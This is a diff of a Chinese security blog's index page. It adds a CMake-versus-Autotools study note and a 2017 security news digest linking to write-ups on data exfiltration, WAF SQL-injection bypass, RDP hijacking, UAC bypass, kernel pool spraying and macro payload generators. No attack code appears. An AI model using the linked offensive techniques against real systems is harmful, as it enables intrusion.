@@ -307,6 +307,274 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/28/CmakeVSautotools/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/09/28/CmakeVSautotools/" itemprop="url">
+                  Cmake VS Autotools
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-28T10:40:33+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统学习。<br></p>
+<h4 id="Cmake使用"><a href="#Cmake使用" class="headerlink" title="Cmake使用"></a>Cmake使用</h4><ul>
+<li><a href="https://www.wikiwand.com/en/CMake" target="_blank" rel="external">wiki关于cmake介绍</a></li>
+<li><a href="https://cmake.org/documentation/" target="_blank" rel="external">官方文档</a> 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P</li>
+<li><a href="https://www.gitbook.com/book/tuannguyen68/learning-cmake-a-beginner-s-guide/details" target="_blank" rel="external">learning-cmake-a-beginner-s-guide/details</a></li>
+<li><a href="http://www.hahack.com/codes/cmake/" target="_blank" rel="external">CMake 入门实战</a></li>
+<li>windows下使用<br><img src="/2017/09/28/CmakeVSautotools/cmake.png" alt=""><h4 id="Cmake-语法简单介绍"><a href="#Cmake-语法简单介绍" class="headerlink" title="Cmake 语法简单介绍"></a>Cmake 语法简单介绍</h4>可以把cmake理解为一种简单的语言，它也有着它的语法和变量。它的语法规则很简单<br><br>1.变量使用${}方式取值<br><br>2.指令（参数1 参数2 。。。）<br><br>3.指令是大小写无关的，参数和变量是大小写敏感的，例如set 和SET 作为指令都是可以的，但是建议全部使用大写的指令。<br><br>4.cmake的语法还是比较灵活且考虑到了各种情况，比如SET(SOURCES_FILES main.c)也可以写成SET(SOURCES_FILES “main.c”)，但是假设一个源文件中的文件名是fu nc.c（中间有了空格），这个时候就有必要加上双引号了。<br><br>5.清理工程，跟经典的autotools系列工具一样，make clean可以对构建结果进行清理。<br><br>6.内部构建和外部构建。内部构建就是直接在根目录下面构建(会在工程目录下产生很多文件，使工程看起来比较乱)，而使用外部构建比如在工程目录下面创建一个build的目录，然后进入build目录下，进行cmake .. 这样生成的文件都在build目录下。推荐是有外部构建，所以一般的构建命令就是进入 build 目录下面，然后 cmake ..  make<br>7.注意cmake 是构建项目的过程,是产生Makefile的过程，也就是生成编译指令的过程，这个过程不会包编译的错误。make才是编译和链接的过程，如果你的代码有问题，或者你的编译指令有有问题(比如未包含动态或者静态的lib)这是时候会产生错误。<br><br>8.ADD_LIBRARY()用来生成动态或者静态链接库的。INCLUDE_DIRECTORY()是用来向工程添加多个特定的头文件搜索路径的，路径之间用空格分开，如果路径中包含了空格，可以使用双引号将它括起来。默认的行为是追加到当前的头文件搜索路径的后面。LINK_DIRECTORIES()添加非标准的共享库搜索路径，TARGET_LINK_LIBRARIES(target  library1 library2),这个指令可以用来为target添加需要连接的共享库.<br><br><img src="/2017/09/28/CmakeVSautotools/makeparam.png" alt=""><br><br><img src="/2017/09/28/CmakeVSautotools/linklib.png" alt=""><br><a href="https://github.com/kevien/cmakesample" target="_blank" rel="external">测试代码见github</a><h4 id="autotools使用"><a href="#autotools使用" class="headerlink" title="autotools使用"></a>autotools使用</h4></li>
+<li><a href="https://geesun.github.io/posts/2015/02/autotool.html" target="_blank" rel="external">使用autotools生成Makefile学习笔记</a></li>
+<li><a href="http://leolovenet.com/downloads/files/autotools.pdf" target="_blank" rel="external">autotools入门</a><h4 id="使用libtool创建库"><a href="#使用libtool创建库" class="headerlink" title="使用libtool创建库"></a>使用libtool创建库</h4><a href="https://www.ibm.com/developerworks/cn/aix/library/1007_wuxh_libtool/index.html" target="_blank" rel="external">使用libtool创建库</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><a href="https://github.com/darx0r/SC-A-Make" target="_blank" rel="external">cmake导致的命令执行问题</a><br><a href="http://thebigdoc.readthedocs.io/en/latest/auto-make-conf.html" target="_blank" rel="external">automake 和 autoconf 使用简明教程</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.youtube.com/watch?v=gYmgbqGfv-8" target="_blank" rel="external">https://www.youtube.com/watch?v=gYmgbqGfv-8</a><br><a href="https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake" target="_blank" rel="external">https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/27/20170927安全动态-以后每2天更新/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/09/27/20170927安全动态-以后每2天更新/" itemprop="url">
+                  20170927安全动态(以后每2天更新)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-27T18:38:36+08:00">
+                2017-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
+<li><p>通过数据包端口号进行数据渗出：PacketKnockOut<br><a href="https://n0where.net/data-exfiltration-via-packet-port-numbers-packetknockout/" target="_blank" rel="external">https://n0where.net/data-exfiltration-via-packet-port-numbers-packetknockout/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">搞apt的可以研究一下</div></pre></td></tr></table></figure>
+</li>
+<li><p>一款智能家居设备的远程命令执行漏洞分析<br><a href="https://forsec.nl/2017/09/smart-home-remote-command-execution-rce/" target="_blank" rel="external">https://forsec.nl/2017/09/smart-home-remote-command-execution-rce/</a></p>
+</li>
+<li>BlobRunner - 在恶意软件分析过程中快速调试 ShellCode 的工具<br><a href="https://github.com/OALabs/BlobRunner" target="_blank" rel="external">https://github.com/OALabs/BlobRunner</a></li>
+<li>Awesome-MitM - GitHub 上一些不错的网络中间人攻击框架收集<br><a href="https://github.com/Chan9390/Awesome-MitM" target="_blank" rel="external">https://github.com/Chan9390/Awesome-MitM</a></li>
+<li>使用 IDA 调试 iOS 程序的步骤<br><a href="http://blog.csdn.net/proteas/article/details/78083512" target="_blank" rel="external">http://blog.csdn.net/proteas/article/details/78083512</a></li>
+<li>JEB2插件教程之一<br><a href="https://blog.flanker017.me/writing-jeb2-plugin/" target="_blank" rel="external">https://blog.flanker017.me/writing-jeb2-plugin/</a></li>
+<li>一个介绍主流漏洞悬赏平台、安全书籍、常见安全工具及漏洞类型的CheatSheet<br><a href="https://github.com/EdOverflow/bugbounty-cheatsheet" target="_blank" rel="external">https://github.com/EdOverflow/bugbounty-cheatsheet</a></li>
+<li>BypassD盾IIS防火墙SQL注入防御（多姿势）<br><https: xianzhi.aliyun.com="" forum="" read="" 2173.html=""></https:></li>
+<li>开源无效流量检测项目<br><a href="http://nameles.org/" target="_blank" rel="external">http://nameles.org/</a></li>
+<li>参数特定XSS的故事<br><a href="http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html" target="_blank" rel="external">http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html</a></li>
+<li>各种应用加密加固<br><a href="https://bettercrypto.org/static/applied-crypto-hardening.pdf" target="_blank" rel="external">https://bettercrypto.org/static/applied-crypto-hardening.pdf</a></li>
+<li>基于 Windows ETW（事件日志）的入侵检测，来自微软研究员在 DerbyCon 2017 会议的演讲。之前推送过他在微软 Blog 上写过的两篇相关文章<br><a href="https://github.com/zacbrown/hiddentreasure-etw-demo/blob/master/zbrown-HiddenTreasureETW-DerbyCon7.pdf" target="_blank" rel="external">https://github.com/zacbrown/hiddentreasure-etw-demo/blob/master/zbrown-HiddenTreasureETW-DerbyCon7.pdf</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>在 linux 下使用 CMake 构建应用程序<br><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-cmake/" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/linux/l-cn-cmake/</a></li>
+<li>64-bit version of Boost for 64-bit windows<br><a href="https://stackoverflow.com/questions/2322255/64-bit-version-of-boost-for-64-bit-windows" target="_blank" rel="external">https://stackoverflow.com/questions/2322255/64-bit-version-of-boost-for-64-bit-windows</a></li>
+<li>查看lib是32位还是64位的<br>“C:\Program Files\Microsoft Visual Studio\VC98\Bin\DUMPBIN.EXE”  C:\boost_1_65_0\lib32-msvc-14.0\boost_atomic-vc140-mt-1_65.lib  /headers<br>*.lib | findstr machine<br><img src="/2017/09/27/20170927安全动态-以后每2天更新/dumplib.png" alt=""></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/26/20170926安全动态/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -384,7 +652,7 @@
         
           
             <h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>ROP介绍<br><a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#x64;&#105;&#x75;&#109;&#x2e;&#x63;&#111;&#x6d;&#x2f;&#64;&#x69;&#x73;&#101;&#x65;&#116;&#104;&#105;&#101;&#118;&#101;&#115;&#x2f;&#x69;&#x6e;&#x74;&#114;&#111;&#45;&#x74;&#x6f;&#x2d;&#x72;&#111;&#x70;&#45;&#x72;&#111;&#x70;&#45;&#101;&#x6d;&#x70;&#111;&#x72;&#105;&#117;&#109;&#45;&#115;&#x70;&#108;&#105;&#116;&#x2d;&#x39;&#x62;&#50;&#x65;&#99;&#54;&#100;&#52;&#100;&#98;&#x30;&#56;">&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#x64;&#105;&#x75;&#109;&#x2e;&#x63;&#111;&#x6d;&#x2f;&#64;&#x69;&#x73;&#101;&#x65;&#116;&#104;&#105;&#101;&#118;&#101;&#115;&#x2f;&#x69;&#x6e;&#x74;&#114;&#111;&#45;&#x74;&#x6f;&#x2d;&#x72;&#111;&#x70;&#45;&#x72;&#111;&#x70;&#45;&#101;&#x6d;&#x70;&#111;&#x72;&#105;&#117;&#109;&#45;&#115;&#x70;&#108;&#105;&#116;&#x2d;&#x39;&#x62;&#50;&#x65;&#99;&#54;&#100;&#52;&#100;&#98;&#x30;&#56;</a></li>
+<li>ROP介绍<br><a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#104;&#116;&#116;&#x70;&#115;&#58;&#x2f;&#x2f;&#109;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x69;&#115;&#x65;&#x65;&#116;&#104;&#105;&#101;&#x76;&#101;&#x73;&#x2f;&#105;&#x6e;&#x74;&#114;&#111;&#45;&#116;&#111;&#x2d;&#114;&#111;&#x70;&#45;&#x72;&#x6f;&#112;&#45;&#101;&#x6d;&#112;&#111;&#114;&#105;&#117;&#109;&#45;&#x73;&#112;&#108;&#x69;&#x74;&#45;&#x39;&#98;&#x32;&#x65;&#x63;&#x36;&#x64;&#52;&#x64;&#x62;&#48;&#x38;">&#104;&#116;&#116;&#x70;&#115;&#58;&#x2f;&#x2f;&#109;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x69;&#115;&#x65;&#x65;&#116;&#104;&#105;&#101;&#x76;&#101;&#x73;&#x2f;&#105;&#x6e;&#x74;&#114;&#111;&#45;&#116;&#111;&#x2d;&#114;&#111;&#x70;&#45;&#x72;&#x6f;&#112;&#45;&#101;&#x6d;&#112;&#111;&#114;&#105;&#117;&#109;&#45;&#x73;&#112;&#108;&#x69;&#x74;&#45;&#x39;&#98;&#x32;&#x65;&#x63;&#x36;&#x64;&#52;&#x64;&#x62;&#48;&#x38;</a></li>
 <li>Biting the Apple that feeds you（咬一口嘴边的苹果） - macOS 内核的 Fuzzing，来自 MWR Labs 在 44CON 会议的演讲<br><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-44con-biting-the-apple-that-feeds-you-2017-09-25.pdf" target="_blank" rel="external">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-44con-biting-the-apple-that-feeds-you-2017-09-25.pdf</a></li>
 <li>High Sierra macOS 系统中，未签名的程序通过编程可以导出 keychain 中的明文密码<br><a href="https://twitter.com/i/web/status/912254053849079808" target="_blank" rel="external">https://twitter.com/i/web/status/912254053849079808</a></li>
 <li>macOS High Sierra 10.13 安全更新内容<br><a href="https://support.apple.com/en-us/HT208144" target="_blank" rel="external">https://support.apple.com/en-us/HT208144</a></li>
@@ -1335,7 +1603,7 @@
 <li>《 The Python Bites your Apple：Fuzzing and exploiting OSX Kernel bugs》，《蛇噬汝果：基于Python的OSX内核漏洞模糊测试挖掘和利用》，来自科恩实验室 Flanker 在 XKungfoo 2016 会议的演讲<br><a href="https://papers.put.as/papers/macosx/2016/xkungfoo.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/xkungfoo.pdf</a></li>
 <li>恶意 Chrome 插件分析<br><a href="https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c" target="_blank" rel="external">https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c</a></li>
 <li>探测 mimikatz 以及其他可疑的 lsass 访问 - Part 1<br><a href="https://www.eideon.com/2017-09-09-THL01-Mimikatz/" target="_blank" rel="external">https://www.eideon.com/2017-09-09-THL01-Mimikatz/</a></li>
-<li>RDP劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话<br><a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x68;&#116;&#x74;&#112;&#115;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#110;&#x65;&#116;&#119;&#111;&#114;&#x6b;&#115;&#x65;&#x63;&#117;&#114;&#105;&#116;&#121;&#47;&#114;&#x64;&#x70;&#x2d;&#104;&#105;&#106;&#x61;&#x63;&#x6b;&#x69;&#x6e;&#x67;&#45;&#x68;&#111;&#119;&#x2d;&#116;&#x6f;&#x2d;&#x68;&#105;&#106;&#x61;&#99;&#x6b;&#45;&#x72;&#x64;&#x73;&#x2d;&#x61;&#x6e;&#x64;&#x2d;&#x72;&#x65;&#109;&#111;&#116;&#x65;&#x61;&#x70;&#x70;&#x2d;&#x73;&#101;&#115;&#115;&#x69;&#111;&#x6e;&#115;&#45;&#x74;&#x72;&#97;&#x6e;&#x73;&#112;&#x61;&#x72;&#x65;&#110;&#116;&#x6c;&#121;&#45;&#x74;&#x6f;&#x2d;&#109;&#x6f;&#x76;&#101;&#45;&#x74;&#x68;&#114;&#111;&#117;&#103;&#x68;&#45;&#x61;&#x6e;&#45;&#x64;&#x61;&#x32;&#97;&#x31;&#101;&#55;&#51;&#97;&#53;&#x66;&#x36;&#x3f;&#115;&#111;&#x75;&#114;&#99;&#101;&#61;&#x6c;&#x69;&#x6e;&#x6b;&#83;&#104;&#x61;&#x72;&#x65;&#x2d;&#x37;&#x64;&#98;&#x36;&#x64;&#x32;&#x64;&#x66;&#x34;&#50;&#x61;&#x36;&#45;&#49;&#x35;&#x30;&#x35;&#x36;&#56;&#x36;&#49;&#53;&#x32;">&#x68;&#116;&#x74;&#112;&#115;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#110;&#x65;&#116;&#119;&#111;&#114;&#x6b;&#115;&#x65;&#x63;&#117;&#114;&#105;&#116;&#121;&#47;&#114;&#x64;&#x70;&#x2d;&#104;&#105;&#106;&#x61;&#x63;&#x6b;&#x69;&#x6e;&#x67;&#45;&#x68;&#111;&#119;&#x2d;&#116;&#x6f;&#x2d;&#x68;&#105;&#106;&#x61;&#99;&#x6b;&#45;&#x72;&#x64;&#x73;&#x2d;&#x61;&#x6e;&#x64;&#x2d;&#x72;&#x65;&#109;&#111;&#116;&#x65;&#x61;&#x70;&#x70;&#x2d;&#x73;&#101;&#115;&#115;&#x69;&#111;&#x6e;&#115;&#45;&#x74;&#x72;&#97;&#x6e;&#x73;&#112;&#x61;&#x72;&#x65;&#110;&#116;&#x6c;&#121;&#45;&#x74;&#x6f;&#x2d;&#109;&#x6f;&#x76;&#101;&#45;&#x74;&#x68;&#114;&#111;&#117;&#103;&#x68;&#45;&#x61;&#x6e;&#45;&#x64;&#x61;&#x32;&#97;&#x31;&#101;&#55;&#51;&#97;&#53;&#x66;&#x36;&#x3f;&#115;&#111;&#x75;&#114;&#99;&#101;&#61;&#x6c;&#x69;&#x6e;&#x6b;&#83;&#104;&#x61;&#x72;&#x65;&#x2d;&#x37;&#x64;&#98;&#x36;&#x64;&#x32;&#x64;&#x66;&#x34;&#50;&#x61;&#x36;&#45;&#49;&#x35;&#x30;&#x35;&#x36;&#56;&#x36;&#49;&#53;&#x32;</a></li>
+<li>RDP劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话<br><a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x68;&#x74;&#116;&#112;&#115;&#58;&#x2f;&#47;&#109;&#101;&#100;&#x69;&#x75;&#x6d;&#46;&#99;&#x6f;&#x6d;&#x2f;&#64;&#110;&#101;&#x74;&#x77;&#x6f;&#x72;&#107;&#x73;&#x65;&#99;&#x75;&#114;&#x69;&#116;&#121;&#47;&#x72;&#100;&#x70;&#45;&#x68;&#105;&#x6a;&#97;&#99;&#107;&#x69;&#x6e;&#x67;&#45;&#x68;&#111;&#x77;&#45;&#116;&#x6f;&#45;&#104;&#105;&#106;&#x61;&#99;&#x6b;&#45;&#114;&#100;&#x73;&#45;&#x61;&#110;&#x64;&#45;&#114;&#x65;&#x6d;&#111;&#x74;&#101;&#97;&#x70;&#112;&#45;&#x73;&#101;&#x73;&#115;&#105;&#x6f;&#110;&#115;&#x2d;&#116;&#114;&#97;&#110;&#115;&#112;&#97;&#x72;&#101;&#110;&#x74;&#108;&#121;&#x2d;&#x74;&#111;&#45;&#x6d;&#x6f;&#118;&#101;&#x2d;&#116;&#104;&#x72;&#111;&#x75;&#x67;&#104;&#x2d;&#97;&#110;&#x2d;&#x64;&#97;&#50;&#x61;&#49;&#101;&#55;&#x33;&#x61;&#x35;&#x66;&#x36;&#63;&#x73;&#111;&#x75;&#114;&#x63;&#101;&#x3d;&#108;&#105;&#x6e;&#107;&#x53;&#104;&#x61;&#x72;&#101;&#45;&#55;&#100;&#98;&#54;&#100;&#50;&#x64;&#102;&#x34;&#50;&#97;&#x36;&#45;&#49;&#53;&#x30;&#53;&#54;&#56;&#54;&#49;&#x35;&#x32;">&#x68;&#x74;&#116;&#112;&#115;&#58;&#x2f;&#47;&#109;&#101;&#100;&#x69;&#x75;&#x6d;&#46;&#99;&#x6f;&#x6d;&#x2f;&#64;&#110;&#101;&#x74;&#x77;&#x6f;&#x72;&#107;&#x73;&#x65;&#99;&#x75;&#114;&#x69;&#116;&#121;&#47;&#x72;&#100;&#x70;&#45;&#x68;&#105;&#x6a;&#97;&#99;&#107;&#x69;&#x6e;&#x67;&#45;&#x68;&#111;&#x77;&#45;&#116;&#x6f;&#45;&#104;&#105;&#106;&#x61;&#99;&#x6b;&#45;&#114;&#100;&#x73;&#45;&#x61;&#110;&#x64;&#45;&#114;&#x65;&#x6d;&#111;&#x74;&#101;&#97;&#x70;&#112;&#45;&#x73;&#101;&#x73;&#115;&#105;&#x6f;&#110;&#115;&#x2d;&#116;&#114;&#97;&#110;&#115;&#112;&#97;&#x72;&#101;&#110;&#x74;&#108;&#121;&#x2d;&#x74;&#111;&#45;&#x6d;&#x6f;&#118;&#101;&#x2d;&#116;&#104;&#x72;&#111;&#x75;&#x67;&#104;&#x2d;&#97;&#110;&#x2d;&#x64;&#97;&#50;&#x61;&#49;&#101;&#55;&#x33;&#x61;&#x35;&#x66;&#x36;&#63;&#x73;&#111;&#x75;&#114;&#x63;&#101;&#x3d;&#108;&#105;&#x6e;&#107;&#x53;&#104;&#x61;&#x72;&#101;&#45;&#55;&#100;&#98;&#54;&#100;&#50;&#x64;&#102;&#x34;&#50;&#97;&#x36;&#45;&#49;&#53;&#x30;&#53;&#54;&#56;&#54;&#49;&#x35;&#x32;</a></li>
 <li>Microsoft Office 有哪些特性可以被后门用来实现常驻（Persist），来自 MWR Labs<br><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf" target="_blank" rel="external">https://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf</a></li>
 <li>JSLinux - 在浏览器里运行 Linux 系统<br><a href="https://bellard.org/jslinux/" target="_blank" rel="external">https://bellard.org/jslinux/</a></li>
 <li>idahunt  - NCCGroup 开源的用于辅助 IDA Pro 逆向分析的工具，譬如批量分析二进制文件<br><a href="https://github.com/nccgroup/idahunt" target="_blank" rel="external">https://github.com/nccgroup/idahunt</a></li>
@@ -1344,300 +1612,6 @@
 <li>Empire中的Invoke-WScriptBypassUAC利用分析<br><a href="https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></li>
 <li>OAuth 2.0 标准实现中的常见漏洞<br><a href="https://blog.avuln.com/article/4" target="_blank" rel="external">https://blog.avuln.com/article/4</a></li>
 <li>Linux攻击面分析<br><https: anvilventures.com="" blog="" linux-attack-surface-analysis.html=""></https:></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/18/20170918安全动态/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/18/20170918安全动态/" itemprop="url">
-                  20170918安全动态
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T13:27:10+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>游戏辅助背后的黑产流水线：年劫持攻击千万次牟利数百万<br><a href="http://www.freebuf.com/articles/network/147652.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/147652.html</a></li>
-<li>理解 V8 字节码<br><a href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775" target="_blank" rel="external">https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775</a></li>
-<li>v8 引擎实现了 Type profiling，可在运行时收集类型信息<br><a href="https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a" target="_blank" rel="external">https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a</a></li>
-<li>反取证技术 - 将进程隐藏在内核模式中<br><a href="https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/" target="_blank" rel="external">https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/</a></li>
-<li>在 PyPI(Python包索引) 上发现十个恶意的库<br><a href="https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415</a></li>
-<li>macphish - 生成 Office for Mac 宏 Payload 的工具<br><a href="https://github.com/cldrn/macphish" target="_blank" rel="external">https://github.com/cldrn/macphish</a></li>
-<li>Windows kernel pool spraying fun<br>Part 3 : <a href="https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html</a>  </li>
-</ul>
-<p>Part 2：<a href="https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html</a>  </p>
-<p>Part  1： <a href="https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html</a></p>
-<ul>
-<li>一次服务器被攻击的应急行动<br><a href="http://www.4hou.com/technology/7653.html" target="_blank" rel="external">http://www.4hou.com/technology/7653.html</a></li>
-<li>Xdebug: A Tiny Attack Surface<br><a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></li>
-<li>利用 WinAFL 来 fuzz MSXML library<br><a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html" target="_blank" rel="external">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html</a></li>
-<li>An Introduction to Printer Exploitation #1<br><a href="https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565" target="_blank" rel="external">https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565</a></li>
